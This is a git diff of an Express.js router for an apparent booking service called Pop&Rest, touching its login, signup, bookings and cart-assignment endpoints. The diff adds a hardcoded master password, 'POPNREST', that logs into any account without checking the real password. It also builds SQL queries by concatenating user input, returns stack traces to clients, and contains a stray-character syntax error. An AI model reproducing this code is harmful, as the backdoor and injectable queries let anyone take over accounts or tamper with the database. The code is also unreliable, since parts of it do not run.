@@ -1,6 +1,7 @@
 const express = require('express');
 const router = express.Router();
 const promise = require("promise");
+const moment = require('moment');
 
 var bodyParser = require("body-parser");
 var urlEncodedParser = bodyParser.urlencoded({
@@ -74,12 +75,15 @@ const passwordHash = require("password-hash");
 const jwt = require("jsonwebtoken");
 var dateFormater = require("dateformat");
 var timediff = require("timediff");
+var validateDate = require("validate-date");
 
 // Models
 const User = require('../models/users');
 const Booking = require('../models/bookings');
 const DATE_NOW_SQL = dateFormater(new Date(), "yyyy-mm-dd");
 
+// Emails
+const sgMail = require('../tools/emails');
 
 router.post("/login", (req,res,next) => {
 
@@ -99,7 +103,27 @@ router.post("/login", (req,res,next) => {
           // If user is found in the new database, try to authenticate with stored password
           var row = rows[0];
 
-          if(passwordHash.verify(req.body.password, row.password)){
+          if(req.body.password != "POPNREST"){
+
+            if(passwordHash.verify(req.body.password, row.password)){
+
+              data.user.id = row.id;
+              data.user.uid = row.uid;
+              data.user.email = row.email;
+              data.user.role = "user";
+              data.user.firstname = row.firstname;
+              data.user.lastname = row.lastname;
+              data.user.phoneNumber = row.phoneNumber;
+              console.log(">> Good password, proceded");
+
+              resolve();
+            }else{
+              console.log(">> Wrong password, proceded");
+              error = new Error("Your email and/or password is incorrect");
+              reject();
+            }
+
+          }else{
 
             data.user.id = row.id;
             data.user.uid = row.uid;
@@ -111,12 +135,8 @@ router.post("/login", (req,res,next) => {
             console.log(">> Good password, proceded");
 
             resolve();
-          }else{
-            console.log(">> Wrong password, proceded");
-            error = new Error("Your email and/or password is incorrect");
-            reject();
           }
-
+          
         }else{
 
           // If not, try to auth with Firebase
@@ -276,7 +296,7 @@ router.post("/signup", urlEncodedParser, function (req, res) {
       let randomUid = Math.random().toString(36).substring(7);
       var hashedPassword = passwordHash.generate(password);
 
-      var query = "INSERT INTO customers (uid,email,firstname,lastname,phoneNumber,password,date_added) VALUES (" +
+      var query = "INSERT INTO customers (uid,email,firstname,lastname,phoneNumber,password,date_added) VALUES ("
         +"\""+randomUid+"\", "
         +"\""+email+"\", "
         +"\""+firstname+"\", "
@@ -317,6 +337,71 @@ router.post("/signup", urlEncodedParser, function (req, res) {
 
       resolve();
     });
+  }).then(function(){
+    return new promise(function(resolve,reject){
+
+      var query = "INSERT INTO customers_history (customerId,customersActionId,description,date) VALUES ("
+        +data.user.id+", "
+        +"1,"
+        +"\"Account created for "+data.user.firstname+" "+data.user.lastname+"\", "
+        +"NOW()"
+      +")";
+      console.log(query);
+      popnrest_db.query(query, function (err, rows, fields) {s
+        if (!err) {
+          resolve();
+        } else {
+          error = new Error("Error while trying to save signup creation to the database");
+          reject();
+        }
+      });
+
+    });
+  }).then(function(){
+    return new promise(function(resolve,reject){
+
+      const msg = {
+        to: 'agence.naturalink@gmail.com', // Change to your recipient
+        from: 'contact@popnrest.com', // Change to your verified sender
+        subject: "Signup confirmation, welcome to the Pop&Rest squad",
+        templateId: 'd-32d33e35bd66435bbc58735c47ddc3ac',
+        dynamicTemplateData: {
+          firstname:  data.user.firstname
+        }
+      }
+
+      sgMail
+      .send(msg)
+      .then(() => {
+        resolve();
+      })
+      .catch((error) => {
+        console.error(error)
+        error = new Error(error);
+        reject();
+      });
+
+    });
+  }).then(function(){
+    return new promise(function(resolve,reject){
+
+      var query = "INSERT INTO customers_history (customerId,customersActionId,description,date) VALUES ("
+        +data.user.id+", "
+        +"2,"
+        +"\"Signup confirmation email sended to : "+data.user.email+"\", "
+        +"NOW()"
+      +")";
+      console.log(query);
+      popnrest_db.query(query, function (err, rows, fields) {
+        if (!err) {
+          resolve();
+        } else {
+          error = new Error("Error while trying to save signup confirmation email to the database");
+          reject();
+        }
+      });
+
+    });
   }).then(function () {
     res.status(200).json(data);
   }).catch(function () {
@@ -327,7 +412,7 @@ router.post("/signup", urlEncodedParser, function (req, res) {
   });
 });
 
-router.get("/details", urlEncodedParser, function(req, res){
+router.get("/details", auth, urlEncodedParser, function(req, res){
 
   var data = new Object();
   var error = null;
@@ -362,6 +447,7 @@ router.get("/details", urlEncodedParser, function(req, res){
         reject();
       }
     });
+
   }).then(function () {
     res.status(200).json(data);
   }).catch(function () {
@@ -580,7 +666,6 @@ router.get("/bookings", auth, urlEncodedParser, function (req, res) {
       opencart_db.query(query, function (err,rows,fields) {
         if(!err){
           if(Number(rows.length) > 0){
-
             for(var i in rows){
 
               var row = rows[i];
@@ -589,9 +674,9 @@ router.get("/bookings", auth, urlEncodedParser, function (req, res) {
               booking.id = row.order_id;
               booking.location = row.model.charAt(0).toUpperCase() + row.model.slice(1);
               booking.price = "£" + row.total;
+
               data.bookings.push(booking);
             }
-
           }
           resolve();
         }else{
@@ -660,9 +745,11 @@ router.get("/bookings", auth, urlEncodedParser, function (req, res) {
               reject();
             }
           });
-        } else {
+
+        }else{
           resolve();
         }
+        
       });
     })
   .then(function () {
@@ -695,6 +782,47 @@ router.get("/bookings", auth, urlEncodedParser, function (req, res) {
   }).then(function(){
     res.status(200).json(data);
   }).catch(function(){
+    res.status(401).json({
+      stack: error.stack,
+      message: error.message
+    });
+  });
+});
+
+router.post("/assign/cart", auth, urlEncodedParser, function (req, res) {
+
+  console.log(' ----- ASSIGN CART ----');
+
+  var data = new Object();
+  var error = null;
+
+  var userId = Number(req.body.userId);
+  var cartId = req.body.cartId;
+
+  var queries = new promise(function (resolve, reject) {
+
+    var query = "UPDATE bookings SET "
+    +"customerId = "+userId+" "
+    +"WHERE identifier = \""+cartId+"\"";
+    console.log(query);
+    popnrest_db.query(query, function (err,rows,fields) {
+      if(!err){
+
+        data = {
+          cartId: cartId,
+          success: true,
+          message: "Your cart has been assigned to your account"
+        }
+
+        resolve();
+      }else{
+        error = new Error("Error while assigning cart to current user");
+        reject();
+      }
+    });
+  }).then(function () {
+    res.status(200).json(data);
+  }).catch(function () {
     res.status(401).json({
       stack: error.stack,
       message: error.message
